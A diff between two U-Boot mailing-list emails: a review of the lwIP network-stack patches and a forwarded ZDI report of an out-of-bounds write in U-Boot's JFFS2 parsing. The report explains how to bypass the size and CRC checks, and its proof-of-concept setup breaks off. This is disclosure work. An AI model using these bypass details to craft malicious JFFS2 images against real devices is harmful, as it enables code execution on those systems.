@@ -4,77 +4,73 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from phobos.denx.de (phobos.denx.de [85.214.62.61])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 8F0F9C3DA49
-	for <u-boot@archiver.kernel.org>; Thu, 25 Jul 2024 22:34:11 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 06E89C3DA49
+	for <u-boot@archiver.kernel.org>; Thu, 25 Jul 2024 22:46:48 +0000 (UTC)
 Received: from h2850616.stratoserver.net (localhost [IPv6:::1])
-	by phobos.denx.de (Postfix) with ESMTP id C331D88385;
-	Fri, 26 Jul 2024 00:34:09 +0200 (CEST)
+	by phobos.denx.de (Postfix) with ESMTP id 390AF883A4;
+	Fri, 26 Jul 2024 00:46:47 +0200 (CEST)
 Authentication-Results: phobos.denx.de; dmarc=pass (p=none dis=none) header.from=konsulko.com
 Authentication-Results: phobos.denx.de; spf=pass smtp.mailfrom=u-boot-bounces@lists.denx.de
 Authentication-Results: phobos.denx.de;
-	dkim=pass (1024-bit key; unprotected) header.d=konsulko.com header.i=@konsulko.com header.b="KuwsfEaX";
+	dkim=pass (1024-bit key; unprotected) header.d=konsulko.com header.i=@konsulko.com header.b="Wrh92kef";
 	dkim-atps=neutral
 Received: by phobos.denx.de (Postfix, from userid 109)
- id B3D6E88395; Fri, 26 Jul 2024 00:34:08 +0200 (CEST)
-Received: from mail-oo1-xc33.google.com (mail-oo1-xc33.google.com
- [IPv6:2607:f8b0:4864:20::c33])
+ id 6793D883BB; Fri, 26 Jul 2024 00:46:46 +0200 (CEST)
+Received: from mail-oa1-x31.google.com (mail-oa1-x31.google.com
+ [IPv6:2001:4860:4864:20::31])
  (using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
  (No client certificate requested)
- by phobos.denx.de (Postfix) with ESMTPS id D167488365
- for <u-boot@lists.denx.de>; Fri, 26 Jul 2024 00:34:05 +0200 (CEST)
+ by phobos.denx.de (Postfix) with ESMTPS id 797008692C
+ for <u-boot@lists.denx.de>; Fri, 26 Jul 2024 00:46:43 +0200 (CEST)
 Authentication-Results: phobos.denx.de;
  dmarc=pass (p=none dis=none) header.from=konsulko.com
 Authentication-Results: phobos.denx.de;
  spf=pass smtp.mailfrom=trini@konsulko.com
-Received: by mail-oo1-xc33.google.com with SMTP id
- 006d021491bc7-5d5af7ae388so170566eaf.0
- for <u-boot@lists.denx.de>; Thu, 25 Jul 2024 15:34:05 -0700 (PDT)
+Received: by mail-oa1-x31.google.com with SMTP id
+ 586e51a60fabf-250ca14422aso437455fac.0
+ for <u-boot@lists.denx.de>; Thu, 25 Jul 2024 15:46:43 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=konsulko.com; s=google; t=1721946844; x=1722551644; darn=lists.denx.de;
- h=in-reply-to:content-disposition:mime-version:references:message-id
- :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
- bh=byq++LCsIW6KR3C9DpPjCHcE/fYnEOZnSVeubVyKNuQ=;
- b=KuwsfEaXcpH67+rNFZevdmE0KkRTd5CRkbU8bFIHAkGch++7jJxvKwgzHy6Q4Tsgjc
- 4vI4y4QDWhV3KzSdS+IPCQseTTa1bGC1Uyg0EtEyr7YGHSdaTyyrWDawYpYwOGFj4Y3D
- CjUjbjeHYoF6cIAsBwBOl9pWeO1m0uCNuUhns=
+ d=konsulko.com; s=google; t=1721947602; x=1722552402; darn=lists.denx.de;
+ h=content-disposition:mime-version:message-id:subject:to:from:date
+ :from:to:cc:subject:date:message-id:reply-to;
+ bh=OXTnqK8M5t1yxZG7paWbkFWRSUukHoMQXBTbnacx+hQ=;
+ b=Wrh92kefToPuckhmSdxDCVzn0VipPSSbeCDLrOySpIEHn73WQEEAmoZZYEQvY8qXMY
+ g6wPfgSgFFubdbeuFryUEP+BaPmByVUdU+irfnZaeygNG9XUwneBD6XTdtRD546KJRTJ
+ bbwTL+Yt/Ty66AG0QA6h31fHjKTymGJVDL2g8=
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=1e100.net; s=20230601; t=1721946844; x=1722551644;
- h=in-reply-to:content-disposition:mime-version:references:message-id
- :subject:cc:to:from:date:x-gm-message-state:from:to:cc:subject:date
- :message-id:reply-to;
- bh=byq++LCsIW6KR3C9DpPjCHcE/fYnEOZnSVeubVyKNuQ=;
- b=k8WdkYSaKZV5VomFvy/svGvSgrSaZsRDk2dmLxe3qZCB5L+kHYpqjcGJ2ucuujGJvB
- Ttr1IxCNln/lLC4jQbVJEDarzv1N4CW5yDQROotxQjokNSDQcVHU9HS6+WsahpycXz6+
- c9BrAao923BK/DGL4f4MLBEEF9lc5hbBaSZ89hxRPWyMCB9zbsHgZhUhAMBH0uGhcIpI
- uXnlJrq/SoHu+trjG+xWJ2XYlzdT+LM7UZlyhqy6t4bnGDZaiYv+y/38H9F/RMeLjeiO
- 3SDPwaO064gYutXRixIdke3sZD7489cxMPulkFM6tJdtRpJJldXU0LTiUIQ30jZEG0x+
- GERQ==
-X-Gm-Message-State: AOJu0YwPfDGFaXmFBmisArC2KfWrZibGnZ4F+CCWkhYSiMAArnpgjTwH
- Kxc79z+vkSNgPPC4xtPAO4XZJS/ujVyi1LGUW140XKSeACB137sYfiDfgROF2bs=
-X-Google-Smtp-Source: AGHT+IES1wmDWs11NStkxYEnwQmI5MMsNrkraVjyjHhlSFqrfTjzreYT/a+439JnlwVQCsWeEl+zqg==
-X-Received: by 2002:a05:6871:7a0:b0:25d:6eaa:ab1e with SMTP id
- 586e51a60fabf-2649fc971b1mr2209633fac.14.1721946844307; 
- Thu, 25 Jul 2024 15:34:04 -0700 (PDT)
+ d=1e100.net; s=20230601; t=1721947602; x=1722552402;
+ h=content-disposition:mime-version:message-id:subject:to:from:date
+ :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+ bh=OXTnqK8M5t1yxZG7paWbkFWRSUukHoMQXBTbnacx+hQ=;
+ b=IofpCzO7G96y4zDmf78e91nRxnVlKhd/nSx5dV3i1vxNsjN8Vmkh1C8U42+v4430A0
+ 8NVnMlR2mS4dZAoVoEaIgIrRFGnIvXIpF5uGUrgVr2+VBe1pu1EHa6oHfqf6gWelHTbS
+ zCNginoYseKZzeRG3Qa42VuHpTfxVIeIJoZmBU6h+k2ixxhZIGYMuPr3n2Wi4WvG0LSL
+ WAwgmeEXw6ft2iDCvUE34VGRKI7G6SQ+jvbGi+CuiLff8z39sbQuNTX4xoH6LqxQkaC8
+ 7g4jzbje7kNvGXIW0mHyNcKTzu7eXNgUGVFy3mVfbwkTN/rZyFmq9mY5tFcD0QmO2YVu
+ rhew==
+X-Gm-Message-State: AOJu0Yy23weRiCkkewZJtUGnMg0JS6RTBxvMo/Bvwb0NNOE6fWa/Iwij
+ z6O2wj2wNyeLZZVYIFrJM2zoJrcCZeIJLF1elwv3p3labVzZlvRwNjKGZh7RBljSwkjj8AyuZUb
+ JzdQ2Wg==
+X-Google-Smtp-Source: AGHT+IGdohO13XJkkBkFV1XYuUaOAPfTZpI5CP1JvxrG7kaQVYRaoKykiX3j7kwDtQwg2mEA1AfsoA==
+X-Received: by 2002:a05:6870:82a0:b0:260:e8cb:68bb with SMTP id
+ 586e51a60fabf-264a0cf165dmr5393881fac.17.1721947601904; 
+ Thu, 25 Jul 2024 15:46:41 -0700 (PDT)
 Received: from bill-the-cat (fixed-187-190-202-45.totalplay.net.
  [187.190.202.45]) by smtp.gmail.com with ESMTPSA id
- 46e09a7af769-7093aff565esm16956a34.52.2024.07.25.15.34.03
+ 586e51a60fabf-265771e5deesm454284fac.38.2024.07.25.15.46.40
+ for <u-boot@lists.denx.de>
  (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
- Thu, 25 Jul 2024 15:34:03 -0700 (PDT)
-Date: Thu, 25 Jul 2024 16:34:01 -0600
+ Thu, 25 Jul 2024 15:46:41 -0700 (PDT)
+Date: Thu, 25 Jul 2024 16:46:39 -0600
 From: Tom Rini <trini@konsulko.com>
-To: Jerome Forissier <jerome.forissier@linaro.org>
-Cc: u-boot@lists.denx.de, Ilias Apalodimas <ilias.apalodimas@linaro.org>,
- Javier Tia <javier.tia@linaro.org>, Raymond Mao <raymond.mao@linaro.org>,
- Maxim Uvarov <muvarov@gmail.com>
-Subject: Re: [PATCH v5 00/20] Introduce the lwIP network stack
-Message-ID: <20240725223401.GD989285@bill-the-cat>
-References: <cover.1721910373.git.jerome.forissier@linaro.org>
- <20240725172220.GA989285@bill-the-cat>
+To: u-boot@lists.denx.de
+Subject: [zdi-disclosures@trendmicro.com: ZDI-CAN-24679: New Vulnerability
+ Report]
+Message-ID: <20240725224639.GE989285@bill-the-cat>
 MIME-Version: 1.0
 Content-Type: multipart/signed; micalg=pgp-sha512;
- protocol="application/pgp-signature"; boundary="QKrcgseAgk70CkXu"
+ protocol="application/pgp-signature"; boundary="v9JJ4XFoL3Ra4iFT"
 Content-Disposition: inline
-In-Reply-To: <20240725172220.GA989285@bill-the-cat>
 X-Clacks-Overhead: GNU Terry Pratchett
 X-BeenThere: u-boot@lists.denx.de
 X-Mailman-Version: 2.1.39
@@ -93,677 +89,498 @@ X-Virus-Scanned: clamav-milter 0.103.8 at phobos.denx.de
 X-Virus-Status: Clean
 
 
---QKrcgseAgk70CkXu
+--v9JJ4XFoL3Ra4iFT
+Content-Type: multipart/mixed; boundary="SeBKNMHT+svZSLo1"
+Content-Disposition: inline
+
+
+--SeBKNMHT+svZSLo1
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
 
-On Thu, Jul 25, 2024 at 11:22:20AM -0600, Tom Rini wrote:
-> On Thu, Jul 25, 2024 at 02:57:21PM +0200, Jerome Forissier wrote:
->=20
-> > This is a rework of a patch series by Maxim Uvarov: "net/lwip: add lwip
-> > library for the network stack" [1]. The goal is to introduce the lwIP T=
-CP/IP
-> > stack [2] [3] as an alternative to the current implementation in net/,
-> > selectable with Kconfig, and ultimately keep only lwIP if possible. Some
-> > reasons for doing so are:
-> > - Make the support of HTTPS in the wget command easier. Javier T. and
-> > Raymond M. (CC'd) have some additional lwIP and Mbed TLS patches to do
-> > so. With that it becomes possible to fetch and launch a distro installer
-> > such as Debian etc. using a secure, authenticated connection directly
-> > from the U-Boot shell. Several use cases:
-> >   * Authentication: prevent MITM attack (third party replacing the
-> > binary with a different one)
-> >   * Confidentiality: prevent third parties from grabbing a copy of the
-> > image as it is being downloaded
-> >   * Allow connection to servers that do not support plain HTTP anymore
-> > (this is becoming more and more common on the Internet these days)
-> > - Possibly benefit from additional features implemented in lwIP
-> > - Less code to maintain in U-Boot
-> >=20
-> > Prior to applying this series, the lwIP stack needs to be added as a
-> > Git subtree with the following command:
-> >=20
-> >  $  git subtree add --squash --prefix lib/lwip/lwip https://git.savanna=
-h.gnu.org/git/lwip.git STABLE-2_2_0_RELEASE
->=20
-> This is better than v4, and on the hardware platforms I could build and
-> boot on (which was most of mine except the am62x_beagleplay), the tests
-> ran and completed, including the tftp+boot a Linux kernel.
->=20
-> The bad news is CI blows up, a lot:
-> https://source.denx.de/u-boot/u-boot/-/pipelines/21764
-> And:
-> https://dev.azure.com/u-boot/a1096300-2999-4ec4-a21a-4c22075e3771/_apis/b=
-uild/builds/9014/logs/106
-> which is another Kconfig dependency problem. I don't _think_ I
-> introduced that, but since this wasn't against top of tree, I had to
-> apply the cmd/Kconfig patch manually.
->=20
-> I have my world build running still and may have more comments based on
-> that.
+I'm re-sending this to the list as I think I might have inadvertently
+dropped it in the mailing list filters.
 
-First, with NET_LWIP being default rather than NET, there's a lot of
-other Kconfig dependency issues. Unfortunately I don't see an easy tool
-for making sure this is all clean aside from a shell loop like:
-for C in `(cd configs;ls)`;do make -s $C;done
+----- Forwarded message from "zdi-disclosures@trendmicro.com" <zdi-disclosu=
+res@trendmicro.com> -----
 
-Once those are fixed, this is feeling pretty OK I think. I assume PXE
-support is high on the follow-up TODO list? That said, after taking
-tiger-rk3588 as an example platform and hacking out PXE related stuff and
-turning on lwIP:
-   aarch64: (for 1/1 boards) all +10144.0 bss -4040.0 data -64.0 rodata -10=
-0.0 text +14348.0
-            tiger-rk3588   : all +10144 bss -4040 data -64 rodata -100 text=
- +14348
-               u-boot: add: 161/-115, grow: 8/-6 bytes: 24552/-14382 (10170)
-                 function                                   old     new   d=
-elta
-                 dhcp_recv                                    -    1296   +=
-1296
-                 tftp_recv                                    -    1152   +=
-1152
-                 ip4_input                                    -     596    =
-+596
-                 new_netif                                    -     556    =
-+556
-                 etharp_query                                 -     552    =
-+552
-                 udp_input                                    -     540    =
-+540
-                 etharp_input                                 -     532    =
-+532
-                 distro_efi_read_bootflow_net                 -     516    =
-+516
-                 dhcp_loop                                    -     512    =
-+512
-                 ip4addr_aton                                 -     492    =
-+492
-                 static.dhcp_select                           -     484    =
-+484
-                 ip4_output_if_src                            -     436    =
-+436
-                 udp_sendto_if_src                            -     408    =
-+408
-                 static.dhcp_reboot                           -     400    =
-+400
-                 etharp_output                                -     400    =
-+400
-                 dhcp_create_msg                              -     384    =
-+384
-                 etharp_find_entry                            -     376    =
-+376
-                 dhcp_bind                                    -     364    =
-+364
-                 send_request                                 -     352    =
-+352
-                 dhcp_discover                                -     352    =
-+352
-                 raw_sendto_if_src                            -     328    =
-+328
-                 pbuf_copy_partial_pbuf                       -     328    =
-+328
-                 netif_add                                    -     324    =
-+324
-                 do_tftpb                                   544     868    =
-+324
-                 pbuf_alloc                                   -     308    =
-+308
-                 dhcp_release_and_stop                        -     308    =
-+308
-                 net_lwip_rx                                  -     292    =
-+292
-                 raw_input                                    -     288    =
-+288
-                 udp_bind                                     -     284    =
-+284
-                 ethernet_input                               -     284    =
-+284
-                 etharp_raw                                   -     284    =
-+284
-                 static.dhcp_handle_ack                       -     272    =
-+272
-                 ping_send                                    -     248    =
-+248
-                 ip4addr_ntoa_r                               -     220    =
-+220
-                 inet_chksum_pseudo                           -     216    =
-+216
-                 ping_recv                                    -     212    =
-+212
-                 etharp_output_to_arp_index                   -     208    =
-+208
-                 netif_set_addr                               -     204    =
-+204
-                 do_ping                                    124     328    =
-+204
-                 dhcp_start                                   -     204    =
-+204
-                 send_data                                    -     192    =
-+192
-                 dhcp_fine_tmr                                -     192    =
-+192
-                 pbuf_copy_partial                            -     184    =
-+184
-                 tftp_close                                   -     176    =
-+176
-                 script_read_bootflow                       420     596    =
-+176
-                 linkoutput                                   -     176    =
-+176
-                 ethernet_output                              -     176    =
-+176
-                 tftp_write                                   -     172    =
-+172
-                 pbuf_memcmp                                  -     168    =
-+168
-                 static.send_error                            -     164    =
-+164
-                 netif_remove                                 -     164    =
-+164
-                 raw_sendto                                   -     160    =
-+160
-                 arp_table                                    -     160    =
-+160
-                 tftp_init_common                             -     156    =
-+156
-                 pbuf_realloc                                 -     152    =
-+152
-                 dhcp_inc_pcb_refcount                        -     152    =
-+152
-                 tftp_tmr                                     -     148    =
-+148
-                 pbuf_free                                    -     148    =
-+148
-                 udp_sendto                                   -     144    =
-+144
-                 udp_connect                                  -     144    =
-+144
-                 sys_timeout_abs                              -     140    =
-+140
-                 ip4_route                                    -     136    =
-+136
-                 static.resend_data                           -     132    =
-+132
-                 pbuf_memfind                                 -     128    =
-+128
-                 pbuf_add_header_impl                         -     128    =
-+128
-                 boot_file_name                               -     128    =
-+128
-                 static.netif_do_set_ipaddr                   -     124    =
-+124
-                 lwip_standard_chksum                         -     124    =
-+124
-                 sys_check_timeouts                           -     120    =
-+120
-                 tftp_error                                   -     116    =
-+116
-                 etharp_free_entry                            -     116    =
-+116
-                 tftp_get                                     -     112    =
-+112
-                 dhcp_run                                     -     112    =
-+112
-                 static.send_ack                              -     108    =
-+108
-                 eth_start_udev                               -     104    =
-+104
-                 close_handle                                 -      96    =
- +96
-                 sys_untimeout                                -      92    =
- +92
-                 ip4_addr_isbroadcast_u32                     -      92    =
- +92
-                 init_packet                                  -      92    =
- +92
-                 etharp_cleanup_netif                         -      92    =
- +92
-                 raw_new                                      -      88    =
- +88
-                 pbuf_remove_header                           -      88    =
- +88
-                 net_lwip_get_netif                           -      88    =
- +88
-                 dhcp_option_trailer                          -      88    =
- +88
-                 udp_sendto_if                                -      84    =
- +84
-                 pbuf_alloc_reference                         -      84    =
- +84
-                 udp_remove                                   -      80    =
- +80
-                 ip4_input_accept                             -      80    =
- +80
-                 netif_set_link_up                            -      76    =
- +76
-                 udp_netif_ip_addr_changed                    -      72    =
- +72
-                 raw_remove                                   -      72    =
- +72
-                 raw_netif_ip_addr_changed                    -      72    =
- +72
-                 dhcp_option_long                             -      68    =
- +68
-                 dhcp_dec_pcb_refcount                        -      68    =
- +68
-                 udp_new                                      -      64    =
- +64
-                 sys_timeout                                  -      60    =
- +60
-                 pbuf_try_get_at                              -      60    =
- +60
-                 pbuf_clone                                   -      60    =
- +60
-                 dhcp_network_changed_link_up                 -      60    =
- +60
-                 tftp_cleanup                                 -      56    =
- +56
-                 pbuf_cat                                     -      56    =
- +56
-                 netif_get_by_index                           -      56    =
- +56
-                 _u_boot_list_2_cmd_2_dhcp                    -      56    =
- +56
-                 tftp_state                                   4      56    =
- +52
-                 pbuf_skip_const                              -      48    =
- +48
-                 net_lwip_if_init                             -      48    =
- +48
-                 dhcp_supplied_address                        -      48    =
- +48
-                 netif_issue_reports                          -      44    =
- +44
-                 tftp_context                                 -      40    =
- +40
-                 ip_data                                      -      40    =
- +40
-                 etharp_request                               -      40    =
- +40
-                 raw_bind                                     -      36    =
- +36
-                 net_lwip_remove_netif                        -      36    =
- +36
-                 memp_malloc                                  -      36    =
- +36
-                 ip4_output_if                                -      36    =
- +36
-                 dhcp_option_short                            -      36    =
- +36
-                 call_lwip_dhcp_fine_tmr                      -      36    =
- +36
-                 netif_set_up                                 -      32    =
- +32
-                 netif_set_down                               -      32    =
- +32
-                 inet_chksum                                  -      32    =
- +32
-                 dhcp_set_state                               -      32    =
- +32
-                 dhcp_rx_options_val                          -      32    =
- +32
-                 pbuf_get_at                                  -      28    =
- +28
-                 distro_efi_read_bootflow                    60      88    =
- +28
-                 distro_efi_boot                            360     388    =
- +28
-                 tftp_client_set_blksize                      -      24    =
- +24
-                 sys_now                                      -      24    =
- +24
-                 pbuf_copy                                    -      24    =
- +24
-                 pbuf_chain                                   -      24    =
- +24
-                 memp_free                                    -      24    =
- +24
-                 eth_bootdev_hunt                            44      68    =
- +24
-                 do_dhcp                                      -      24    =
- +24
-                 pbuf_ref                                     -      20    =
- +20
-                 netif_input                                  -      20    =
- +20
-                 do_net_stats                               328     348    =
- +20
-                 static.str                                   -      16    =
- +16
-                 ip4addr_ntoa                                 -      16    =
- +16
-                 udp_recv                                     -      12    =
- +12
-                 tftp_init_client                             -      12    =
- +12
-                 netif_set_default                            -      12    =
- +12
-                 udp_pcbs                                     -       8    =
-  +8
-                 tftp_read                                    -       8    =
-  +8
-                 tftp_open                                    -       8    =
-  +8
-                 raw_recv                                     -       8    =
-  +8
-                 raw_pcbs                                     -       8    =
-  +8
-                 pbuf_add_header                              -       8    =
-  +8
-                 next_timeout                                 -       8    =
-  +8
-                 netif_null_output_ip4                        -       8    =
-  +8
-                 netif_list                                   -       8    =
-  +8
-                 netif_default                                -       8    =
-  +8
-                 net_lwip_new_netif_noip                      -       8    =
-  +8
-                 net_lwip_new_netif                           -       8    =
-  +8
-                 lwip_htons                                   -       8    =
-  +8
-                 lwip_htonl                                   -       8    =
-  +8
-                 dhcp_rx_options_given                        -       8    =
-  +8
-                 dhcp_pcb                                     -       8    =
-  +8
-                 udp_new_ip_type                              -       4    =
-  +4
-                 static.xid                                   -       4    =
-  +4
-                 mem_trim                                     -       4    =
-  +4
-                 mem_malloc                                   -       4    =
-  +4
-                 mem_free                                     -       4    =
-  +4
-                 ip_chksum_pseudo                             -       4    =
-  +4
-                 current_timeout_due_time                     -       4    =
-  +4
-                 udp_port                                     -       2    =
-  +2
-                 ip_id                                        -       2    =
-  +2
-                 static.called                                -       1    =
-  +1
-                 netif_num                                    -       1    =
-  +1
-                 etharp_cached_entry                          -       1    =
-  +1
-                 dhcp_pcb_refcount                            -       1    =
-  +1
-                 net_boot_file_name_explicit                  1       -    =
-  -1
-                 tftp_windowsize                              2       -    =
-  -2
-                 tftp_window_size_option                      2       -    =
-  -2
-                 tftp_next_ack                                2       -    =
-  -2
-                 tftp_last_nack                               2       -    =
-  -2
-                 tftp_block_size_option                       2       -    =
-  -2
-                 tftp_block_size                              2       -    =
-  -2
-                 ping_seq_number                              2       -    =
-  -2
-                 net_our_vlan                                 2       -    =
-  -2
-                 net_native_vlan                              2       -    =
-  -2
-                 env_flags_vartype_rep                        7       5    =
-  -2
-                 timeout_count_max                            4       -    =
-  -4
-                 timeout_count                                4       -    =
-  -4
-                 tftp_timeout_count_max                       4       -    =
-  -4
-                 tftp_remote_port                             4       -    =
-  -4
-                 tftp_remote_ip                               4       -    =
-  -4
-                 tftp_our_port                                4       -    =
-  -4
-                 static.first_call                            4       -    =
-  -4
-                 saved_tftp_block_size_option                 4       -    =
-  -4
-                 net_try_count                                4       -    =
-  -4
-                 net_state                                    4       -    =
-  -4
-                 net_server_ip                                4       -    =
-  -4
-                 net_rx_packet_len                            4       -    =
-  -4
-                 net_restarted                                4       -    =
-  -4
-                 net_ping_ip                                  4       -    =
-  -4
-                 net_netmask                                  4       -    =
-  -4
-                 net_ip_id                                    4       -    =
-  -4
-                 net_ip                                       4       -    =
-  -4
-                 net_gateway                                  4       -    =
-  -4
-                 net_dns_server                               4       -    =
-  -4
-                 net_dev_exists                               4       -    =
-  -4
-                 net_boot_file_size                           4       -    =
-  -4
-                 net_boot_file_expected_size_in_blocks        4       -    =
-  -4
-                 net_arp_wait_reply_ip                        4       -    =
-  -4
-                 net_arp_wait_packet_ip                       4       -    =
-  -4
-                 dummy_handler                                4       -    =
-  -4
-                 arp_wait_tx_packet_size                      4       -    =
-  -4
-                 arp_wait_try                                 4       -    =
-  -4
-                 net_server_ethaddr                           6       -    =
-  -6
-                 net_ethaddr                                  6       -    =
-  -6
-                 udp_packet_handler                           8       -    =
-  -8
-                 timeout_ms                                   8       -    =
-  -8
-                 time_handler                                 8       -    =
-  -8
-                 time_delta                                   8       -    =
-  -8
-                 tftp_prev_block                              8       -    =
-  -8
-                 tftp_load_size                               8       -    =
-  -8
-                 tftp_load_addr                               8       -    =
-  -8
-                 tftp_cur_block                               8       -    =
-  -8
-                 tftp_block_wrap_offset                       8       -    =
-  -8
-                 tftp_block_wrap                              8       -    =
-  -8
-                 net_tx_packet                                8       -    =
-  -8
-                 net_rx_packet                                8       -    =
-  -8
-                 arp_wait_timer_start                         8       -    =
-  -8
-                 arp_wait_packet_ethaddr                      8       -    =
-  -8
-                 arp_tx_packet                                8       -    =
-  -8
-                 arp_packet_handler                           8       -    =
-  -8
-                 net_get_arp_handler                         12       -    =
- -12
-                 default_filename                            13       -    =
- -13
-                 time_start                                  16       -    =
- -16
-                 start_again_timeout_handler                 16       -    =
- -16
-                 _u_boot_list_2_env_clbk_2_vlan              16       -    =
- -16
-                 _u_boot_list_2_env_clbk_2_serverip          16       -    =
- -16
-                 _u_boot_list_2_env_clbk_2_nvlan             16       -    =
- -16
-                 _u_boot_list_2_env_clbk_2_netmask           16       -    =
- -16
-                 _u_boot_list_2_env_clbk_2_ipaddr            16       -    =
- -16
-                 _u_boot_list_2_env_clbk_2_gatewayip         16       -    =
- -16
-                 arp_is_waiting                              20       -    =
- -20
-                 net_set_udp_handler                         24       -    =
- -24
-                 ip_checksum_ok                              28       -    =
- -28
-                 ping_timeout_handler                        32       -    =
- -32
-                 net_clear_handlers                          36       -    =
- -36
-                 ip_to_string                                36       -    =
- -36
-                 is_serverip_in_cmd                          40       -    =
- -40
-                 net_send_udp_packet                         44       -    =
- -44
-                 net_get_async_tx_pkt_buf                    44       -    =
- -44
-                 eth_halt_state_only                         44       -    =
- -44
-                 on_vlan                                     48       -    =
- -48
-                 on_serverip                                 48       -    =
- -48
-                 on_nvlan                                    48       -    =
- -48
-                 on_netmask                                  48       -    =
- -48
-                 on_ipaddr                                   48       -    =
- -48
-                 on_gatewayip                                48       -    =
- -48
-                 net_eth_hdr_size                            56       -    =
- -56
-                 arp_init                                    56       -    =
- -56
-                 net_init_loop                               60       -    =
- -60
-                 eth_init                                   300     232    =
- -68
-                 env_flags_validate                         644     576    =
- -68
-                 copy_filename                               76       -    =
- -76
-                 net_init                                   112      32    =
- -80
-                 string_to_vlan                              84       -    =
- -84
-                 net_set_timeout_handler                     84       -    =
- -84
-                 compute_ip_checksum                         92       -    =
- -92
-                 tftp_init_load_addr                        100       -    =
--100
-                 skip_num                                   104       -    =
--104
-                 tftp_filename                              128       -    =
--128
-                 arp_request                                128       -    =
--128
-                 tftp_timeout_handler                       132       -    =
--132
-                 lmb_get_free_size                          136       -    =
--136
-                 net_set_udp_header                         144       -    =
--144
-                 arp_timeout_check                          148       -    =
--148
-                 net_update_ether                           152       -    =
--152
-                 eth_validate_ethaddr_str                   152       -    =
--152
-                 string_to_ip                               156       -    =
--156
-                 net_parse_bootfile                         160       -    =
--160
-                 net_set_ether                              180       -    =
--180
-                 net_set_ip_header                          184       -    =
--184
-                 arp_raw_request                            228       -    =
--228
-                 ping_start                                 276       -    =
--276
-                 net_send_ip_packet                         292       -    =
--292
-                 net_check_prereq                           308       -    =
--308
-                 ping_receive                               332       -    =
--332
-                 net_start_again                            336       -    =
--336
-                 net_loop                                   544       -    =
--544
-                 arp_receive                                560       -    =
--560
-                 tftp_send                                  584       -    =
--584
-                 net_process_received_packet                764       4    =
--760
-                 tftp_start                                 908       -    =
--908
-                 net_boot_file_name                        1024       -   -=
-1024
-                 tftp_handler                              1308       -   -=
-1308
-                 net_pkt_buf                               7744    6208   -=
-1536
-                 arp_tx_packet_buf                         1600       -   -=
-1600
+Date: Thu, 18 Jul 2024 20:04:42 +0000
+=46rom: "zdi-disclosures@trendmicro.com" <zdi-disclosures@trendmicro.com>
+To: "u-boot@lists.denx.de" <u-boot@lists.denx.de>, "trini@konsulko.com" <tr=
+ini@konsulko.com>
+Subject: ZDI-CAN-24679: New Vulnerability Report
 
-Although I'm not 100% sure that config is functionally equivalent, so
-perhaps it would be helpful if you could take a board or two and
-reconfigure them with the legacy stack, but equivalent functionality to
-with lwIP, for comparison sake? Thanks!
+The attachment could not be scanned for viruses because it is a password pr=
+otected file.
+ZDI-CAN-24679: Das U-Boot JFFS2 Image Handling Out-Of-Bounds Write Local Pr=
+ivilege Escalation Vulnerability
+
+-- CVSS -----------------------------------------
+
+8.2: AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
+
+-- ABSTRACT -------------------------------------
+
+Trend Micro's Zero Day Initiative has identified a vulnerability affecting =
+the following products:
+Das U-Boot - Das U-Boot
+
+-- VULNERABILITY DETAILS ------------------------
+* Version tested: 2024.07-rc4
+* Installer file: N/A
+* Platform tested: QEMU
+
+---
+
+### Analysis
+
+Das U-Boot versions from 2002_11_05_0120 to v2024.07-rc4 are vulnerable to =
+an arbitrary code execution attack. This vulnerability exists due to an unc=
+hecked memcpy function used when processing a JFFS2 filesystem image. An at=
+tacker could exploit this by crafting a malicious JFFS2 image that tricks m=
+emcpy into overwriting memory at an arbitrary offset with malicious code. T=
+his could result in the attacker executing arbitrary code on the system or =
+causing other memory corruption issues.
+
+The parsing of JFFS2 filesystem in Das U-Boot is handled by the `jffs2_1pas=
+s_read_inode()` function defined in `fs/jffs2/jffs2_1pass.c`. ( https://git=
+hub.com/qemu/u-boot/blob/master/fs/jffs2/jffs2_1pass.c )
+
+At line 777 of this file, there is a statement for memory copy:
+
+```
+ldr_memcpy(lDest, src, jNode->dsize);
+```
+
+The first two arguments for memcpy are assigned as:
+
+At line 770: `lDest =3D (uchar *) (dest + jNode->offset);`
+At line 755 and 756: `src =3D ((uchar *)jNode) + sizeof(struct jffs2_raw_in=
+ode);`
+
+As shown above, the source, destination, and size of the memcpy are control=
+led by an attacker and its following content, and Das U-boot does not prope=
+rly check these arguments.
+
+Although Das U-Boot does have some checks on the content of inodes, these c=
+hecks can be easily bypassed:
+
+At line 758, it checks if `JNode->offset > totalSize`, but totalSize is ass=
+igned as totalSize =3D jNode->isize at line 714. Therefore, this check can =
+be bypassed by setting `JNode->isize` to 0xFFFFFFFF.
+
+At lines 763, it also checks the CRC, but this check can be bypassed by set=
+ting both `JNode->csize` and `JNode->data_crc` to 0.
+
+### Proof of Concept
+
+To prove the concept, we created a small program that generates a specially=
+ crafted JFFS2 filesystem image. We then used QEMU to demonstrate the poten=
+tial risk of this vulnerability. The Das U-Boot, when reading the specially=
+ crafted filesystem image, writes content given by us to a memory location =
+specified by us, causing the system to crash. We have tested this in Ubuntu=
+ 14.04. Follow the following instructions to set up the environment and con=
+duct the PoC test.
+
+- Install QEMU for MINI2440:
+
+```
+sudo apt-get install git git-core
+cd ~
+mkdir mini2440_qemu/
+cd mini2440_qemu
+git clone git://repo.or.cz/qemu/mini2440.git qemu
+cd qemu
+=2E/configure --target-list=3Darm-softmmu --prefix=3D$HOME/workspace/mini24=
+40_qemu/qemu/mini2440
+make
+make install
+export PATH=3D$HOME/workspace/mini2440_qemu/qemu/mini2440/bin:$PATH
+git clone https://github.com/WeitaoZhu/mini2440-buildroot.git
+cd mini2440-buildroot
+make mini2440_defconfig
+make menuconfig
+```
+
+- Modify Filesystem images to NAND flash with 512B Page and 16 kB erasesize
+
+```
+make -j4
+cd ~
